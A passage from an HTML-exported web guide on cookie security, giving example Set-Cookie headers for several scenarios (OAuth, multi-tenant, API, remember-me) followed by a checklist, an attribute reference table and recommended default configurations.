referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8097-9ef0-eb70a91fa24c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-806d-b113-f317168608c9" class=""><strong>Why:</strong><br/>- <code>__Host-</code> prefix: Maximum isolation, no subdomain access<br/>- <code>SameSite=Strict</code>: No cross-site requests (CSRF protection)<br/>- <code>Max-Age=1800</code>: 30-minute session (shorter for security)</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-802d-a165-d83a0e60b454" class="">Scenario 3: OAuth/SSO Integration</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80b9-8b9e-f10ec6ccf22c" class=""><strong>Requirements:</strong><br/>- Cross-origin cookie transmission<br/>- Third-party authentication<br/>- Secure transmission</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d5-9348-d673927abce1" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ab-92be-f9149e7054b8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-oauthState=xyz789; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=600</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8076-808f-da7d50ec2400" class=""><strong>Why:</strong><br/>- <code>SameSite=None</code>: Allows cross-origin requests<br/>- <code>Secure</code>: Required for <code>SameSite=None</code><br/>- <code>Max-Age=600</code>: Short-lived (10 minutes) for OAuth state<br/>- <strong>Note:</strong> No CSRF protection from SameSite, must use CSRF tokens</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80ae-a0ae-f52d14961204" class="">Scenario 4: Multi-Tenant SaaS Application</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-804b-843e-d377c44abcb7" class=""><strong>Requirements:</strong><br/>- Cookies scoped to specific tenant<br/>- No cross-tenant cookie access<br/>- Subdomain isolation</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8001-9d18-f0064244a6ee" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ac-9ebd-eb84d1c4bb8a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// For tenant1.example.comSet-Cookie: __Host-tenant-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/// For tenant2.example.comSet-Cookie: __Host-tenant-sessionId=def456; Secure; HttpOnly; SameSite=Lax; Path=/</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a4-a66f-eae4f14995b1" class=""><strong>Why:</strong><br/>- <code>__Host-</code> prefix: Prevents subdomain access<br/>- Each tenant gets isolated cookies<br/>- No <code>Domain</code> attribute ensures host-specific scope</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8099-bdfe-f376a6256e48" class="">Scenario 5: API Authentication</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80b0-a2d6-fd262cd61418" class=""><strong>Requirements:</strong><br/>- RESTful API authentication<br/>- Mobile app and web app support<br/>- Token-based authentication</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80eb-ae43-f72496e06f9c" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8005-93f9-d72bcf93ea0e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Option 1: Cookie-based (for web)Set-Cookie: __Secure-apiToken=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/api; Max-Age=3600// Option 2: Token in Authorization header (for mobile)// More appropriate for APIs, but cookies can work too</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d8-a8b0-e3beea9a7910" class=""><strong>Why:</strong><br/>- <code>Path=/api</code>: Scoped to API endpoints<br/>- <code>SameSite=Strict</code>: Maximum security for API<br/>- Consider using Bearer tokens instead for APIs</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8084-bb3a-c85a25702526" class="">Scenario 6: Remember Me Functionality</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8022-9ab7-fa61a8e0e5fb" class=""><strong>Requirements:</strong><br/>- Long-lived authentication<br/>- Persistent login<br/>- Secure storage</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8019-9a69-cc5748ae58ed" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8006-96f5-c4f92dea613a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Remember me token (long-lived, but separate from session)Set-Cookie: __Secure-rememberToken=longlived123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000// Regular session (short-lived)Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8075-a0ba-f28a99de0fa8" class=""><strong>Why:</strong><br/>- Separate tokens for different purposes<br/>- Remember token can be longer-lived<br/>- Session token should be short-lived<br/>- Both should be HttpOnly and Secure</p></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8005-ab82-e39d4b823c01"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8091-a62a-e48a949735ba" class="">Summary</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8020-a59e-cedefde1aa4c" class="">Essential Cookie Security Checklist</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d9-b0f8-c4aadc634e3a" class="">✅ <strong>Always use for sensitive cookies:</strong><br/>- <code>HttpOnly</code>: Prevents JavaScript access (XSS protection)<br/>- <code>Secure</code>: HTTPS only transmission<br/>- <code>SameSite</code>: CSRF protection (Strict or Lax)</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a9-89fc-f7e82b531255" class="">✅ <strong>Consider using:</strong><br/>- <code>__Host-</code> or <code>__Secure-</code> prefix: Additional security enforcement<br/>- Short <code>Max-Age</code>: Limit exposure window<br/>- Restrictive <code>Path</code>: Minimize scope</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bf-aebb-d00edca6448f" class="">✅ <strong>Avoid:</strong><br/>- Setting <code>Domain</code> unless necessary<br/>- Long expiration times<br/>- <code>SameSite=None</code> without <code>Secure</code><br/>- Sensitive data in cookies without <code>HttpOnly</code></p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8033-8067-c5005c017775" class="">Quick Reference</h3></div><div style="display:contents" dir="ltr"><table id="2b2562ad-76f0-8070-b95d-dd8079d875b4" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-803b-8828-d2b12c40344f"><th id="aQD[" class="simple-table-header-color simple-table-header">Attribute</th><th id="&lt;:Qz" class="simple-table-header-color simple-table-header">Protects Against</th><th id="gn;Z" class="simple-table-header-color simple-table-header">Purpose</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-80e1-9a64-e745d8e1f899"><td id="aQD[" class=""><code>HttpOnly</code></td><td id="&lt;:Qz" class="">XSS (cookie theft)</td><td id="gn;Z" class="">Prevent JavaScript access to cookies</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-80c9-a50a-c82a705f8a87"><td id="aQD[" class=""><code>Secure</code></td><td id="&lt;:Qz" class="">MitM attacks</td><td id="gn;Z" class="">Ensure HTTPS-only transmission</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-8039-9121-d13a449195f4"><td id="aQD[" class=""><code>SameSite=Strict</code></td><td id="&lt;:Qz" class="">CSRF attacks</td><td id="gn;Z" class="">Maximum CSRF protection</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-80ae-9de5-f2e3ae033308"><td id="aQD[" class=""><code>SameSite=Lax</code></td><td id="&lt;:Qz" class="">CSRF attacks</td><td id="gn;Z" class="">Balanced CSRF protection</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-80db-af75-ee4cacaadc91"><td id="aQD[" class=""><code>SameSite=None</code></td><td id="&lt;:Qz" class="">None (allows CSRF)</td><td id="gn;Z" class="">Cross-site requests (use with tokens)</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-800b-9213-c4bd5e5e35d3"><td id="aQD[" class=""><code>__Host-</code> prefix</td><td id="&lt;:Qz" class="">Subdomain attacks</td><td id="gn;Z" class="">Subdomain isolation</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-8086-a8c5-d5df6b7543da"><td id="aQD[" class=""><code>__Secure-</code> prefix</td><td id="&lt;:Qz" class="">Insecure cookies</td><td id="gn;Z" class="">Enforce Secure attribute</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-806f-9f2a-d92ee1d4b7b4" class="">Final Recommendations</h3></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-804e-a052-ca461a080583" class="numbered-list" start="1"><li><strong>Default Configuration:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80c3-8486-e50e83c30306" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-sessionId=&lt;token&gt;; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80fe-95fc-c19538c13887" class="numbered-list" start="2"><li><strong>High Security Configuration:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80d2-bdad-d8bf0201c722" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Host-sessionId=&lt;token&gt;; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8095-ba6d-e91c1368e820" class="numbered-list" start="3"><li><strong>Third-Party Configuration:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8001-be46-ed7feb16fb4d" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-widgetId=&lt;token&gt;; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8006-a207-cf01026fbfeb" class="">Key Takeaways</h3></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8073-9353-d205b19da97b" class="numbered-list" start="1"><li><strong>HttpOnly protects against XSS, NOT CSRF</strong></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80fe-b112-f20715f2a363" class="numbered-list" start="2"><li><strong>SameSite protects against CSRF</strong></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8088-bd36-f0d1747de60a" class="numbered-list" start="3"><li><strong>Secure ensures HTTPS-only transmission</strong></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80a5-8c98-f906aef72f8a" class="numbered-list" start="4"><li><strong>Use all three together for maximum security</strong></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-809d-8d4a-d5606642d2c5" class="numbered-list" start="5"><li><strong>Cookie prefixes add additional enforcement</strong></li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-804c-858b-c6a8d088395d" class="">Remember: Cookie security is just one layer of defense. Always implement defense-in-depth with proper authentication, authorization, input validation, and other security measures.</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>